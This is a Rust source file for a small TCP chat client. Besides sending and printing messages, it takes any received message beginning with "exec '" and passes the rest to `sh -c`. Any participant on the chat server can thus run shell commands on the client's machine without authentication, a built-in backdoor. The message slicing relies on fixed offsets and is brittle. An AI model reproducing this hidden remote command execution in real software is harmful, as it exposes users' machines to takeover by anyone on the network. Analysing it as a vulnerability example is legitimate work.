use std::io::{self, ErrorKind, Read, Write};
use std::net::TcpStream;
use std::sync::mpsc::{self, TryRecvError};
use std::thread;
use std::time::Duration;
use std::process::Command;

const LOCAL: &str = "127.0.0.1:7878";
const MSG_SIZE: usize = 1024;

fn main() {
    let mut client = TcpStream::connect(LOCAL).expect("Stream failed to connect");
    client.set_nonblocking(true).expect("failed to initiate non-blocking");

    let (tx, rx) = mpsc::channel::<String>();

    thread::spawn(move || loop {
        let mut buff = vec![0; MSG_SIZE];
        match client.read_exact(&mut buff) {
            Ok(_) => {
                let msg = String::from_utf8(buff.into_iter().take_while(|&x| x != 0).collect::<Vec<_>>()).unwrap();
                if msg.starts_with("orange:"){
                	let frmsg = &msg[8..msg.len()];
                	println!("{}", frmsg);
                	
                	if frmsg.starts_with("exec '"){
                		println!("frmsg: {}", &frmsg[5..frmsg.len()]);
                	}	
                } else{
                	println!("Received message from {}", msg);
                	let frmsg = &msg[7..msg.len()];
                	println!("{}", frmsg);
                	let command = &frmsg[6..frmsg.len()];
 					               	                	
                	if frmsg.starts_with("exec '"){
                		println!("here:   {}", command);
                		Command::new("sh").arg("-c").arg(command).spawn().unwrap();
                	    }
                }
            },
            Err(ref err) if err.kind() == ErrorKind::WouldBlock => (),
            Err(_) => {
                println!("connection with server was severed");
                break;
            }
        }

        match rx.try_recv() {
            Ok(msg) => {
                let mut buff = msg.clone().into_bytes();
                buff.resize(MSG_SIZE, 0);
                client.write_all(&buff).expect("writing to socket failed");
                println!("message sent {}", &msg[7..msg.len()]);
            }, 
            Err(TryRecvError::Empty) => (),
            Err(TryRecvError::Disconnected) => break
        }

        thread::sleep(Duration::from_millis(100));
    });

    println!("Write a Message:");
    loop {
        let mut buff = String::new();
		buff = "orange: ".to_owned();
        io::stdin().read_line(&mut buff).expect("reading from stdin failed");
        let msg = buff.trim().to_string();
        if msg == ":quit" || tx.send(msg).is_err() {break}
    }
    println!("bye bye!");

}
